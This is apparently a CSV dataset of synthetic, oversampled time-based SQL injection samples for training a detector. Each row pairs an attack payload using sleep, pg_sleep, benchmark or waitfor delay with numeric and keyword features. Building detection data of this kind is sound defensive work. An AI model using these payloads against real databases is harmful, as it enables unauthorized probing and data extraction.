id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,time,select sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,0.7339910009938612,51.374499563241514,16.59362489081038,2.8317923441517467,14.593624890810379,1.0,26.187249781620757,9.593624890810379,0.28422650403305666,0.01955800230460382,0.5097790011523019,0.18643649251003758,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.296812445405189,1.0,0.29681244540518903,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.703187554594811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.703187554594811
SMOTE_000002,attack,time,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",nearest_attack_euclidean,R000239,0.8476543457933117,56.48904741579149,19.0,3.299375636740205,23.244523707895745,1.6888690730260638,23.555654634869683,8.0,0.4111246227834401,0.030531910128979822,0.4161428635410842,0.14220060354649583,0.0,3.6888690730260634,0.0,0.0,0.0,0.0,0.0,4.311130926973936,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.3111309269739362,0.0,2.7755575615628914e-17,0.0,1.0,0.6888690730260639,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000003,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,0.5410251456795543,63.73354658472305,23.366773292361525,3.487937417559347,19.489031056482034,10.0,27.12225776412051,7.1222577641205085,0.3054685004482701,0.15704268096452023,0.42578709025812506,0.11170172832908458,0.0,0.8777422358794913,0.24451552824101735,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.2445155282410174,0.0,0.8777422358794913,0.12225776412050868,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000004,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,0.08657683649772217,50.0,24.31439571913939,4.0917957705459225,17.0,12.0,13.0,8.0,0.34,0.24,0.26,0.16,2.0,1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,0.24432697019630803,60.332895003462085,24.121172273042006,3.784284925487664,20.90879204781506,15.0,19.242344546084013,5.181758409563011,0.3446245722435335,0.2500536879991774,0.3197265794419705,0.08559516031531852,0.1817584095630116,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,1.0,2.220446049250313e-16,0.060586136521003864,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,0.060586136521003864,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.060586136521004
SMOTE_000006,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.8818410451838364,59.79750044865798,18.67673080374292,2.940371592223135,10.000000000000002,10.0,30.767308037429213,9.030192411228764,0.16912530499798414,0.16912530499798414,0.5116399200799934,0.15010946992403834,0.6767308037429215,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.353461607485842,0.0,0.0,1.0,1.0,0.6767308037429214,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,time,"1""  )   waitfor delay '0:0:5' and   (  ""hhzy"" like ""hhzy",nearest_attack_euclidean,R000091,1.063983398127399,52.41328121793306,22.210156248473,3.9442063721166636,26.15937500610799,3.2101562484730035,13.99296872098705,9.050781242365014,0.5143391930582702,0.0615482053964085,0.25287732078141545,0.17123528076390584,2.0,3.2101562484730026,0.0,0.0,0.0,0.21015624847300274,0.0,1.6304687454190079,0.0,0.0,0.0,0.21015624847300285,1.0,1.0,0.0,0.0,0.0,0.21015624847300268,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000008,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000234,1.3360421359069452,50.2742269783453,24.451546043309406,4.039111139290645,16.451546043309406,11.725773021654703,14.371134891726484,7.725773021654703,0.32741782099356875,0.23333252052650652,0.2854869779873864,0.15376268049253836,2.0,1.1102230246251565e-16,1.451546043309407,0.0,0.0,1.0,0.0,1.2742269783452964,0.0,0.0,0.0,2.4515460433094067,1.0,0.0,0.7257730216547035,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.7257730216547035,0.0,0.27422697834529647,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,5.2790665767490506,65.3269691328163,28.046709876116616,4.199054464211817,26.34159190563135,4.248172153398119,19.039398489709097,15.697806584077744,0.41335334983332406,0.061223900381107525,0.2466205214384699,0.27880222834709856,2.0,0.5503655693203762,2.0,0.0,0.0,0.0,1.0,3.24817215339812,0.0,2.2014622772815042,0.8992688613592477,2.899268861359248,1.0,0.5503655693203761,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.449634430679624,0.0,2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.44963443067962394,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8992688613592477
SMOTE_000010,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000290,0.8186781786919657,86.85593207957528,27.628813584084945,3.6481461834903226,25.515254336339773,15.0,34.59830491140539,11.742372831830112,0.29703978506115947,0.17321680816755147,0.39534251262820136,0.1344008941430877,3.0,1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.056779623872584,0.6855932079575281,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,3.469446951953614e-18,1.0,0.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
